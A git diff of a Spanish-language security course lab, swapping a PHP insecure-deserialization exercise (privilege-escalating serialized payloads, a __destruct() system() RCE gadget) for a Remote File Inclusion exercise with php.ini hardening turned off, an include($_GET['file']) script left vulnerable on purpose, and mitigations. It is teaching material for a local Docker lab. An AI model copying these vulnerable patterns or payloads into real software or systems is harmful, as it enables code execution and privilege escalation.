@@ -1,776 +1,326 @@
-# PPS-Unidad3Actividad9-Angel
-Explotación y Mitigación de vulnerabilidad de Deserialización Insegura
+# PPS-Unidad3Actividad9-RFI
+Explotación y Mitigación de Remote File Inclusion (RFI)
 
-Objetivos:
+Tenemos como objetivo:
 
-- Ver cómo se pueden hacer ataques de Deserialización insegura.
+> - Ver cómo se pueden hacer ataques Inclusión de Archivos Remotosn (RFI).
+>
+> - Analizar el código de la aplicación que permite ataques de Inclusión de Archivos Remotosn (RFI).
+>
+> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.
 
-- Analizar el código de la aplicación que permite ataques de Deserialización insegura.
-
-- Explorar la deserialización insegura y mitigarlo con JSON
-
-- Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.
-
-
-## ¿Qué es Unsafe Deserialization?
+## ¿Qué es Remote File Include?
 ---
 
-La deserialización insegura ocurre cuando una aplicación carga objetos serializados sin validación, lo que permite que un atacante modifique los datos y ejecute código arbitrario.
+La vulnerabilidad de Inclusión de archivos permite a un atacante incluir un archivo, generalmente explotando un mecanismo “dynamic file inclusion” implementado en la aplicación de destino. La vulnerabilidad se produce debido al uso de la entrada suministrada por el usuario sin la validación adecuada.
 
-Impacto de la Deserialización Insegura:
+Esto puede conducir a algo como la salida del contenido del archivo, pero dependiendo de la gravedad, también puede conducir a:
 
-• Escalada de privilegios (ejemplo: convertir un usuario normal en administrador).
+- Ejecución de código en el servidor web
 
-• Ejecución de código remoto (RCE) si la aplicación permite __wakeup() o __destruct().
+- Ejecución de código en el lado del cliente, como JavaScript, que puede conducir a otros ataques, como secuencias de comandos en sitios cruzados (XSS)
 
-• Modificación de datos internos en la aplicación.
+- Denegación de Servicio (DoS)
 
+- Divulgación de Información Sensible
 
-
+Remote File Inclusion (también conocido como RFI) es el proceso de incluir archivos remotos a través de la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Esta vulnerabilidad se produce, por ejemplo, cuando una página recibe, como entrada, la ruta al archivo que tiene que incluirse y esta entrada no se desinfecta correctamente, lo que permite inyectar una URL externa. Aunque la mayoría de los ejemplos apuntan a scripts PHP vulnerables, debemos tener en cuenta que también es común en otras tecnologías como JSP, ASP y otras.
+ 
 ## ACTIVIDADES A REALIZAR
 ---
-> Lee detenidamente la sección de vulnerabilidades de subida de archivos.  de la página de PortWigger <https://portswigger.net/web-security/deserialization>
+> Lee detenidamente la sección de vulnerabilidades de subida de archivos.  de la página de PortWigger <https://portswigger.net/web-security/file-upload>
 >
-> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionDeserializacionInsegura.pdf)
+> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionRFI.pdf)
 > 
+> También y como marco de referencia, tienes [ la sección de correspondiente de ataque de inclusión de archivos remotos de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
+>
 
+### Configuración para deshabilitar la seguridad en PHP 8.2 (sólo para pruebas)
 
-Vamos realizando operaciones:
+Para poder realizar la actividad vamos a deshabilitar la seguridad y así poder trabajar la vulnerabilidad correctamente. Lo realizaremos cambiando la configuración de PHP.
 
-### Iniciar entorno de pruebas
-
--Situáte en la carpeta de del entorno de pruebas de nuestro servidor LAMP e inicia el escenario multicontenedor escribiendo en el terminal de comandos o en el PowerShell:
+Para ello nos conectamos a nuestro contenedor si estás utilizando es escenario con docker:
 
 ~~~
-docker-compose up -d
+docker exec -it lamp-php83 /bin/bash
 ~~~
 
+ y una vez que nos hemos conectado, guardamos una copia de seguridad del archivo de configuración para volverlo a restaurar al final de la actividad:
+
+~~~
+cd /usr/local/etc/php/
+cp php.ini php.ini-original
+nano php.ini
+~~~
+
+Añadimos al final las variables indicadas:
+
+~~~
+disable_functions =
+allow_url_include = On
+allow_url_fopen = On
+open_basedir = 
+~~~
+
+Una vez cambiada la configuración, reiniciamos el servicio o en el caso de que utilicemos docker, reiniciamos el contenedor:
+
+~~~
+docker-compose restart webserver
+~~~
+
+![](images/rfi1.png)
+
+
+Aquí puedes encontrar el fichero de configuración [php.ini](files/php.ini.rfi).
+
+¿Qué hacemos con estas configuraciones?
+
+1. Elimina todas las funciones deshabilitadas (disable_functions vacío).
+
+2. Habilita la inclusión de archivos remotos (allow_url_include = On).
+
+3. Habilita file_get_contents() para URLs externas (allow_url_fopen = On).
+
+4. Desactiva open_basedir para permitir la ejecución en cualquier directorio.
 
 ## Código vulnerable
 ---
 
-La vulnerabilidad aparece debido a la creación de objetos, de manera que para pasar objetos a través de la red entre diferentes funciones serializamos los datos para que puedan ser transmitidos a través de dicho medio. 
-
-La vulnerabilidad se explota en la deserialización de los datos de usuario sin validación (unserialize($_GET['data'])) y permite modificar el objeto y otorgar privilegios no autorizados.
-
-Para mostrar las variables del objeto serializado vamos a crear un archivo vulnerable con nombre **MostrarObjeto.php** con el siguiente contenido:
-
+Tenemos el siguiente código vulnerable al cual le tenemos que indicar un fichero a subir al servidor:
 ~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
-
+?php
+// Verificar si se ha pasado un archivo por parámetro
+if (isset($_GET['file'])) {
+        $file = $_GET['file'];
+        include($file);
 }
 
-if (isset($_GET['data'])) {
-    $data = $_GET['data'];
-    $obj = @unserialize($data);
-
-    echo "<h3>Objeto deserializado:</h3>";
-    echo "<pre>";
-    print_r($obj);
-    echo "</pre>";
-
-    // Opcional: forzar destrucción
-    unset($obj);
-} else {
-    echo "No se proporciona� ningun dato.";
-}
-
-~~~
-
-También vamos a crear un archivo con nombre GenerarObjeto.php para visualizar los datos serializados y mostrar un enlace a MostrarObjeto.php
-
-~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
-}
-
-$serialized = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $user = new User();
-    $user->username = $_POST['username'] ?? 'anon';
-    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';
-
-    $serialized = serialize($user);
-}
 ?>
+<form method="GET">
+        <input type="text" name="file" placeholder="Usuario">
+        <button type="submit">Subir Archivo</button>
+</form>
 
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Generador de Objeto Serializado</title>
-</head>
-<body>
-    <h2>Generar objeto serializado</h2>
-    <form method="post">
-        <label>Nombre de usuario:</label>
-        <input type="text" name="username" required><br><br>
+~~~ 
 
-        <label>¿Administrador?</label>
-        <select name="isAdmin">
-            <option value="0">No</option>
-            <option value="1">Sí</option>
-        </select><br><br>
+![](images/rfi3.png)
 
-        <button type="submit">Generar</button>
-    </form>
+### Explotación de RFI
+---
+Para comprobar la explotación de RFI vamos a crear un archivo malicioso exploit.php en un servidor controlado por el atacante.
 
-    <?php if ($serialized): ?>
-        <h3>Objeto serializado:</h3>
-        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>
+En nuestro caso [exploit.php](files/exploit.php) lo vamos a colocar en nuestro servidor. Tendrá el siguiente contenido:
 
-        <p>
-            <strong>Enlace para probar:</strong><br>
-            <a href="MostrarObjeto.php?data=<?= urlencode($serialized) ?>" target="_blank">
-                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
-            </a>
-        </p>
-    <?php endif; ?>
-</body>
-</html>
-~~~
-
-**¿Qué te permite hacer esto?**
-
-- Crear objetos User con isAdmin = true o false.
-
-- Ver la cadena serializada.
-
-- Probar directamente el exploit en tu script MostrarObjeto.php (o el que verifica isAdmin).
-
-
-![](images/UD3.png)
-
-Vemos como el objeto serializado sería: 
-
-
-`O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
-
-... y nos dá el enlace parar probarlo, enviándolo a MostrarObjeto.php
 
 ~~~
-http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
+<?php
+echo "¡Servidor comprometido!";
+// Código malicioso, como una web shell o un backdoor
+?>
 ~~~
 
-Vemos cómo podemos componer la ruta para mostrar el objeto serializado conctenando:
-`http://localhost/MostrarObjeto.php?data=` con el objeto serializado, en este caso: `O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
 
-![](images/UD4.pg)
+En esta ocasión sólo nos mostrará un mensaje, pero podría hacer muchas cosas más.
+
+Para ejecutarlo a través de la aplicación vulnerable colocando su dirección en nuestro campo
+![](images/rfi3.png)
 
 
-##  Explotación de Deserialización Insegura
+o bien concatenamos su dirección a la de nuestro archivo rfi.php:
+
+
+~~~
+http://localhost/rfi.php?file=http://localhost/exploit.php
+~~~
+
+Si el código del atacante se ejecuta en el servidor víctima, significa que la aplicación es vulnerable.
+
+![](images/rfi2.png)
+
+**Posibles efectos del ataque:**
+
+- Acceso no autorizado al servidor.
+
+- Robo de datos sensibles.
+
+- Modificación o eliminación de archivos del sistema.
+
+- Instalación de malware o puertas traseras (backdoors).
+
+## Mitigación de RFI
 ---
 
-Por lo tanto a la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto serializado.
+La solución más efectiva para eliminar las vulnerabilidades de inclusión de archivos es evitar pasar la entrada enviada por el usuario a cualquier API de sistema de archivos/marco. Si esto no es posible, la aplicación puede mantener una lista de permisos de archivos que puede incluir la página y, a continuación, utilizar un identificador (por ejemplo, el número de índice) para acceder al archivo seleccionado. Cualquier solicitud que contenga un identificador no válido debe rechazarse para que no haya oportunidad de que los usuarios maliciosos manipulen la ruta. Mira el [Archivo de Hoja de Trucos para buenas prácticas de seguridad](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) en este tema.
 
-Esto puede ser utilizado por atacantes, para enviar a nuestros códigos PHP la seriealización modificada.
+Vamos realizando operaciones.
+
+**Bloquear la inclusión de URLs externas**
+
+En lugar de permitir cualquier entrada sin validación, se debe bloquear la inclusión de archivos remotos:
+
+~~~
+<?php
+// Verificar si se ha pasado un archivo por parámetro
+if (isset($_GET['file'])) {
+        $file = $_GET['file'];
+        // Bloquear URLs externas
+        if (filter_var($file, FILTER_VALIDATE_URL)) {
+                die("Incluir archivos remotos está prohibido.");
+        }
+        // Incluir el archivo sin más restricciones (Aún vulnerable a LFI)
+        include($file);
+}
+
+?>
+<form method="GET">
+        <input type="text" name="file" placeholder="Usuario">
+        <button type="submit">Iniciar Sesión</button>
+</form>
+~~~
+Como vemos ya no nos deja meter direcciones url, ya que aplicamos un filtro de validación de URLs.
+
+![](images/rfi3.png)
+
+Sin embargo, esta solución no es suficiente, ya que aún permite archivos locales maliciosos.
+
+**Restringir las rutas de inclusión**
+
+La siguiente aproximación, sería limitar la inclusión de archivos solo a una lista de archivos específicos dentro del servidor:
+~~~
+<?php
+// Verificar si se ha pasado un archivo por parámetro
+if (isset($_GET['file'])) {
+        $file = $_GET['file'];
+        // Lista blanca de archivos permitidos
+        $whitelist = ['file1.php', 'files/file2.php'];
+        if (!in_array($file, $whitelist)) {
+                die("Acceso denegado.");
+        }
+        // Incluir solo archivos de la lista blanca
+        include($file);
+}
+
+?>
+<form method="GET">
+        <input type="text" name="file" placeholder="Usuario">
+        <button type="submit">Iniciar Sesión</button>
+</form>
+~~~
+
+En esta ocasión nos dejaría el acceso a los ficheros file1.php y a /files/file2.php
+
+**Usar rutas absolutas y sanitización**
+
+Podemos ir un paso más allá asegurándonos que solo se incluyan archivos desde una ubicación específica, en este caso el mismo directorio que el script:
+
+~~~
+<?php
+// Establecemos el directorio permitido en el mismo directorio del script
+$baseDir = __DIR__ . DIRECTORY_SEPARATOR;
+
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+
+    // Normalizamos la ruta para evitar ataques con '../'
+    $filePath = realpath($baseDir . $file);
+    // Verificamos si el archivo está dentro del directorio permitido
+    if ($filePath === false || strpos($filePath, $baseDir) !== 0) {
+        die("Acceso denegado.");
+    }
+
+    // Verificamos que el archivo realmente existe
+    if (!file_exists($filePath)) {
+        die("El archivo no existe.");
+    }
+    include($file);
+
+}
+?>
+<form method="GET">
+        <input type="text" name="file" placeholder="Usuario">
+        <button type="submit">Iniciar Sesión</button>
+</form>
+
+~~~
+
+Ahora sólo nos dejara incluir archivos del directorio actual.
+
+**Deshabilitar allow_url_include en php.ini**
+
+Para prevenir la inclusión remota de archivos en PHP podemos configurar el servidor para que acepte únicamente archivos locales y no archivos remotos.
+
+Esto, como hemos visto anteriormente se hace configurando la variable allow_url_include en el archivo php.ini. Esta opción previene ataques RFI globalmente.
  
 
-**Crear un objeto malicioso en PHP**
-
-![](images/UD5.png)
-
-Como podemos ver, del enlace generado, cualquier persona puede saber, el nombre del tipo de objetos, variables y valores que tienen.
-
-Por ejemplo, el usuario Raul podría:
-
-
-**1 - Modificar la serialización.**
-
-El objeto serializado es: 
-
-~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D
-~~~
-
-Podemos cambiar los datos del valor IsAdmin:
-
-~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 
-~~~
-
-![](images/UD6.png)
-
-Raul podría haber cambiado su estado, convirtiéndose en administrador.
-
-
-**2 - Crear un archivo para crear la serialización con los datos que se deseen.**
-
-Crear el archivo **HackerAdmin.php**  y ejecutar este código en la máquina atacante:
-
-~~~
-<?php
-class User {
-	public $username = "hacker";
-	public $isAdmin = true;
-}
-echo urlencode(serialize(new User()));
-?>
-~~~
-
-Salida esperada (ejemplo):
-
-~~~
-O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
-~~~
-
-Este objeto serializado podemos usarlo para enviarlo a MostrarObjeto.php y así hacker sería administrador.
-
-![](images/UD6.png)
-
-
-- Copiar la salida obtenida
-
-- Acceder a esta URL en el navegador `http://localhost/MostrarObjdeto.php?data=` y concatenarla con el código obtenido:
-
-
-Al mandarlo, tendríamos el mismo resultado, Hacker se convierte en `Admin`.
-
-
-~~~
-http://localhost/MostrarObjdeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
+~~~ 
+allow_url_include = Off
 ~~~
 
 
-![](images/UD2.png)
-
-
-**Intentar RCE con __destruct()**
-
-Si la clase User tiene un método **__destruct()**, se puede abusar para ejecutar código en el servidor. Este es el riesgo mayor al explotar la deserialización.
-
-Aquí tenemos nuestra clase modificada con **Destruct()**. Crea el fichero **GenerarObjeto1.php**
-
-
-~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
-    public $cmd;
-
-    public function __destruct() {
-        if (!empty($this->cmd)) {
-            //echo "<pre>Ejecutando comando: {$this->cmd}\n";
-            system($this->cmd);
-            //echo "</pre>";
-        }
-    }
-}
-$serialized = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $user = new User();
-    $user->username = $_POST['username'] ?? 'anon';
-    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';
-
-    $serialized = serialize($user);
-}
-?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Generador de Objeto Serializado</title>
-</head>
-<body>
-    <h2>Generar objeto serializado</h2>
-    <form method="post">
-        <label>Nombre de usuario:</label>
-        <input type="text" name="username" required><br><br>
-
-        <label>¿Administrador?</label>
-        <select name="isAdmin">
-            <option value="0">No</option>
-            <option value="1">Sí</option>
-        </select><br><br>
-
-        <button type="submit">Generar</button>
-    </form>
-
-    <?php if ($serialized): ?>
-        <h3>Objeto serializado:</h3>
-        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>
-
-        <p>
-            <strong>Enlace para probar:</strong><br>
-            <a href="MostrarObjeto.php?data=<?= urlencode($serialized) ?>" target="_blank">
-                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
-            </a>
-        </p>
-    <?php endif; ?>
-</body>
-</html>
-
-~~~
-
-Este cambio introduce:
-
-- Una nueva propiedad **$cmd** que contendrá el comando a ejecutar.
-
-- El método **__destruct()** que se dispara automáticamente al final del script (cuando el objeto es destruido), lo que lo hace perfecto para ilustrar la explotación por deserialización.
-
-Vamos a modificar el objeto malicioso para introducir un código a ejecutar. El atacante de esta manera, podría serializar el objeto introduciendo un código para ejecutar en nuestro servidor, Este archivo lo llamo **explotarGenerarObjeto1.php**:
-
-~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
-    public $cmd;
-
-    public function __destruct() {
-        if (!empty($this->cmd)) {
-            // ⚠️ Ejecución insegura de código del sistema
-            echo "<pre>Ejecutando comando: {$this->cmd}\n";
-            system($this->cmd);
-            echo "</pre>";
-        }
-    }
-}
-
-$serialized = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $user = new User();
-    $user->username = $_POST['username'] ?? 'anon';
-    $user->isAdmin = ($_POST['isAdmin'] ?? '0') === '1';
-    $user->cmd = $_POST['cmd'] ?? '';
-
-    $serialized = serialize($user);
-}
-?>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Generador de Objeto Serializado</title>
-</head>
-<body>
-    <h2>Generar objeto serializado con código ejecutable</h2>
-    <form method="post">
-        <label>Nombre de usuario:</label>
-        <input type="text" name="username" required><br><br>
-
-        <label>¿Administrador?</label>
-        <select name="isAdmin">
-            <option value="0">No</option>
-            <option value="1">Sí</option>
-        </select><br><br>
-
-        <label>Comando a ejecutar (ej: <code>whoami</code>):</label><br>
-        <input type="text" name="cmd" size="50"><br><br>
-
-        <button type="submit">Generar</button>
-    </form>
-
-    <?php if ($serialized): ?>
-        <h3>Objeto serializado:</h3>
-        <textarea cols="80" rows="4"><?= htmlspecialchars($serialized) ?></textarea><br><br>
-
-        <p>
-            <strong>Enlace para probar:</strong><br>
-            <a href="MostrarObjeto1.php?data=<?= urlencode($serialized) ?>" target="_blank">
-                MostrarObjeto.php?data=<?= htmlspecialchars(urlencode($serialized)) ?>
-            </a>
-        </p>
-    <?php endif; ?>
-</body>
-</html>
-~~~
-
-🧪 Para la prueba
-
-1. Marca "Sí" en la opción de administrador.
-
-2. Escribe un comando como **whoami, ls -l, id**, etc.
-
-3. Se serializa el objeto incluyendo ese comando.
-
-4. Al deserializarlo en **MostrarObjeto.php**, se ejecuta automáticamente en el **__destruct(**).
-
-![](images/UD7.png)
-
-El atacante habría inyectado en la serialización la ejecución del comando `ls -l /tmp/output.txt`pero podría haber sido cualquier otro comando.
-
-![](images/UD8.png)
-
-Vemos en el resultado que la ejecución no parece anómalo, pero veamos que ha pasado en el servidor.
-
-![](images/UD9.png)
-
-Veamos que contiene el archivo `/tmp/output.txt`. 
-
-Como nosotros extamos usando docker, o bien entramos dentros del servidor apacher y vemos el archivo, o ejecutamos el siguiente comando docker para que nos lo muestre:
-
-~~~
-docker exec -it lamp-php83 /bin/bash -c 'cat /tmp/output.txt'
-~~~
-
-![](images/UD10.png)
-
-Como vemos, hemos podido ejecutar comandos dentro del servidor. En este caso con el usuario **www-data**, pero si lo combinamos con otros ataques como escalada de privilegios, podríamos haber ejecutado cualquier comando.
-
-## Mitigación de Unsafe Deserialization
+### **Código seguro**
 ---
 
-### ¿Cómo Validar los datos?
-
-Si queremos mitigar realmente ese problema (que no se puedan añadir propiedades inesperadas), una estrategia efectiva es usar la interfaz **Serializable** o **__wakeup()** junto con la visibilidad privada o protegida de las propiedades, y una validación explícita del contenido deserializado.
-
-
-Este código:
-
-- Aún usa **unserialize()** (sólo lo usamos para propósitos educativos, no debe usarse en un entorno real).
-
-- Valida que el objeto es de la clase esperada.
-
-- Valida que las propiedades están bien formadas (por tipo y existencia).
-
-- Aún permite ver el riesgo de __destruct() si no se valida bien.
-
-Para ello creamos el archivo **MostrarObjeto1.php**:
+Aquí está el código securizado:
 
 ~~~
-<?php
-class User {
-    public $username;
-    public $isAdmin = false;
+?php
+// Establecemos el directorio permitido en el mismo directorio del script
+$baseDir = __DIR__ . DIRECTORY_SEPARATOR;
+$whitelist = ['file1.php', 'file2.php'];
 
-    public function __destruct() {
-        if (!empty($this->cmd)) {
-            echo "<pre>Ejecutando comando (simulado): {$this->cmd}</pre>";
-            // system($this->cmd); // ← mantener comentado para pruebas seguras
+if (isset($_GET['file'])) {
+        $file = $_GET['file'];
+        // Bloquear URLs externas
+        if (filter_var($file, FILTER_VALIDATE_URL)) {
+                die("Incluir archivos remotos está prohibido.");
         }
-    }
-}
-
-if (isset($_GET['data'])) {
-    $data = $_GET['data'];
-
-    // Deserialización segura: solo se permite la clase User
-    $obj = @unserialize($data, ['allowed_classes' => ['User']]);
-
-    if (!$obj instanceof User) {
-        echo "Error: El objeto deserializado no es de tipo User.";
-        exit;
-    }
-
-    // Propiedades permitidas
-    $propiedadesPermitidas = ['username', 'isAdmin'];
-
-    // Obtener propiedades reales del objeto deserializado
-    $propiedadesObjeto = array_keys(get_object_vars($obj));
-
-    // Verificar que no hay propiedades adicionales
-    $propiedadesExtra = array_diff($propiedadesObjeto, $propiedadesPermitidas);
-
-    if (!empty($propiedadesExtra)) {
-        echo "<h3>Error:</h3>";
-        echo "El objeto contiene propiedades no permitidas: <pre>" . implode(", ", $propiedadesExtra) . "</pre>";
-        exit;
-    }
-
-    // Validar tipos de propiedades
-    $errores = [];
-
-    if (!isset($obj->username) || !is_string($obj->username)) {
-        $errores[] = "El campo 'username' no está definido o no es una cadena.";
-    }
-
-    if (!isset($obj->isAdmin) || !is_bool($obj->isAdmin)) {
-        $errores[] = "El campo 'isAdmin' no está definido o no es booleano.";
-    }
-
-
-    if (!empty($errores)) {
-        echo "<h3>Errores de validación:</h3><ul>";
-        foreach ($errores as $e) {
-            echo "<li>" . htmlspecialchars($e) . "</li>";
+        // Normalizamos la ruta para evitar ataques con '../'
+        $filePath = realpath($baseDir . $file);
+        // Verificamos si el archivo está dentro del directorio permitido
+        if ($filePath === false || strpos($filePath, $baseDir) !== 0) {
+            die("Acceso denegado.");
         }
-        echo "</ul>";
-        exit;
-    }
-
-    echo "<h3>Objeto deserializado válidamente:</h3>";
-    echo "<pre>";
-    print_r($obj);
-    echo "</pre>";
-
-    // Forzar destrucción
-    unset($obj);
-} else {
-    echo "No se proporciona ningún dato.";
-}
-~~~
-
-
-
-Esta versión:
-
-- Usa propiedades privadas.
-
-- Implementa la interfaz **Serializable**.
-
-- Valida los datos antes de restaurarlos.
-
-- Impide que se inyecten propiedades no autorizadas.
-
-
-
-**Explicación de la Validación de Claves**
----
-
-~~~
-http://localhost/deserialize_full.php?data={"username":"hacker","isAdmin":true, "bypass":"0"}
-~~~
-
-Si se detecta un parámetro no permitido (bypass en este caso), se muestra el error:
-
-`Error: Clave inválida detectada`
-
-![](images/UD12.png)
-
-
-✅ ¿Qué mejora esta versión?
-
-- No se pueden inyectar propiedades personalizadas, ya que solo se deserializa lo que explícitamente se espera.
-
-- No hay ejecución de comandos.
-
-- Control total de cómo se deserializa el objeto.
-
-
-### Utilizando JSON 
----
-
-La mejor forma de evitar ataques de deserialización insegura es no usar **unserialize()** con datos externos.
-
-Usar *JSON* en lugar de **serialize()**.
-
-Además, si quieresmos reforzar aún más la seguridad, podemos comprobar que las claves que pasamos són únicamente las claves permitidas, así que corresponden con los tipos de datos que deberían. 
-
-✅ Creamos el archivo **MostrarObjetoJson.php**:
-
-~~~
-<?php
-class User {
-    private $username;
-    private $isAdmin = false;
-    private $cmd;
-
-    public function __construct($username, $isAdmin, $cmd) {
-        $this->username = $username;
-        $this->isAdmin = $isAdmin;
-        $this->cmd = $cmd;
-    }
-
-    public function __toString() {
-        return "Usuario: {$this->username}<br>" .
-               "Es administrador: " . ($this->isAdmin ? "Sí" : "No") . "<br>" .
-               "Comando: " . htmlspecialchars($this->cmd);
-    }
-}
-
-if (isset($_GET['data'])) {
-    $json = $_GET['data'];
-
-    $data = json_decode($json, true);
-
-    // Validar que sea JSON válido
-    if (json_last_error() !== JSON_ERROR_NONE) {
-        echo "JSON mal formado.";
-        exit;
-    }
-
-    // Claves permitidas
-    $clavesPermitidas = ['username', 'isAdmin', 'cmd'];
-    $clavesRecibidas = array_keys($data);
-
-    // Verificar si hay claves no permitidas
-    $clavesNoPermitidas = array_diff($clavesRecibidas, $clavesPermitidas);
-
-    if (!empty($clavesNoPermitidas)) {
-        echo "Error: El JSON contiene claves no permitidas: ";
-        echo "<pre>" . implode(", ", $clavesNoPermitidas) . "</pre>";
-        exit;
-    }
-
-    // Validar tipos de datos
-    if (!isset($data['username'], $data['isAdmin'], $data['cmd']) ||
-        !is_string($data['username']) ||
-        !is_bool($data['isAdmin']) ||
-        !is_string($data['cmd'])) {
-        echo "Datos inválidos.";
-        exit;
-    }
-
-    // Crear el objeto
-    $user = new User($data['username'], $data['isAdmin'], $data['cmd']);
-
-    echo "<h3>Datos recibidos:</h3>";
-    echo "<pre>{$user}</pre>";
-} else {
-    echo "No se proporciona ningún dato.";
-}
-~~~
-
-Vamos a crear también el archivo **GenerarObjetoJson.php** que nos creará un objeto JSON Alumno que es administrador:
-
-~~~
-<?php
-$data = [
-    "username" => "alumno",
-    "isAdmin" => true,
-    "cmd" => "id" // esto no se ejecutará, solo se mostrará como texto
-];
-echo urlencode(json_encode($data));
-
-~~~
-🧪 Cómo probarlo
-
-- Acceder al php de generación de JSON:
-
-~~~
-http://localhost/GenerarObjetoJson.php
-~~~
-
-- Objetnemos el JSON:
-
-~~~
-%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
-~~~
-
-- Concatenar el JSON con la url de MostrarObjetoJson.php
-
-~~~
-http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
-~~~
-
-La ejecución solo se permitirá si los datos contienen exclusivamente **username** y **isAdmin**.
-
-Ahora nos muestra los datos que hemos introducido. Incluso si hemos intentado introducir un comando para explotar, nos muestra sólo el cómando, no lo ejecuta:
-
-![](images/UD13.png)
-
-- Y si probamos  modificando **MostrarObjetoJson.php** para que no esté incluído el comando:
-
-~~~
-class User {
-    private $username;
-    private $isAdmin = false;
-~~~
-
-
-- Si quieres puedes utilizar el siguiente código  para crear el objeto de forma interactiva, nos mostrará el enlace a **MostrarObjetoJson.php** con el objeto.
-
-~~~
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Generador de Objeto JSON</title>
-</head>
-<body>
-    <h2>Generar objeto en formato JSON</h2>
-    <form method="post">
-        <label>Nombre de usuario:</label>
-        <input type="text" name="username" required><br><br>
-
-        <label>¿Administrador?</label>
-        <select name="isAdmin">
-            <option value="0">No</option>
-            <option value="1">Sí</option>
-        </select><br><br>
-
-        <button type="submit">Generar</button>
-    </form>
-
-    <?php
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $username = $_POST['username'];
-        $isAdmin = $_POST['isAdmin'] == '1' ? true : false;
-
-        // Puedes agregar más validación aquí si quieres
-
-        $data = [
-            "username" => $username,
-            "isAdmin" => $isAdmin,
-            "cmd" => ""  // Opcionalmente se puede dejar vacío o no incluirlo
-        ];
-
-        $json = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
-        $encoded = urlencode($json);
-        ?>
-
-        <h3>Objeto JSON generado:</h3>
-        <textarea cols="80" rows="6"><?= htmlspecialchars($json) ?></textarea><br><br>
-
-        <p>
-            <strong>Enlace para probar:</strong><br>
-            <a href="MostrarObjetoJson.php?data=<?= $encoded ?>" target="_blank">
-                MostrarObjetoJson.php?data=<?= htmlspecialchars($encoded) ?>
-            </a>
-        </p>
-    <?php } ?>
-</body>
-</html>
-
-~~~
-![](images/UD14.png)
-
-✅ Ventajas de usar JSON
-
-- No crea objetos automáticamente, por lo que no hay métodos mágicos como **__destruct()** que se ejecuten.
-
-- Es más legible y portable entre lenguajes.
-
-- **json_decode()** NO ejecuta código PHP, evitando RCE.
-
-- Validación explícita de los datos, sin riesgo de objetos maliciosos.
-
-➡️  Al intentar introducir otros atributos dentro del objeto **user** otros datos:
-~~~
-<?php
-$data = [
-  "username"=> "pepe",
-  "isAdmin" => false,
-  "cmd" => "id",
-  "extra" => "soy malo 😈"
-];
-echo urlencode(json_encode($data));
-~~~
-
-Tendremos unos datos codificados,  por lo que para probar, tendríamos el siguiente enlace:
+       // Lista blanca de archivos permitidos
+        if (!in_array($file, $whitelist)) {
+                die("Acceso denegado.");
+        }
  
+        // Verificamos que el archivo realmente existe
+        if (!file_exists($filePath)) {
+            die("El archivo no existe.");
+        }
+        include($file);
+
+}
+?>
+<form method="GET">
+        <input type="text" name="file" placeholder="Usuario">
+        <button type="submit">Iniciar Sesión</button>
+</form>
+
 ~~~
-http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
+🔒 Medidas de seguridad implementadas
+
+- Bloqueadas URLs externas.
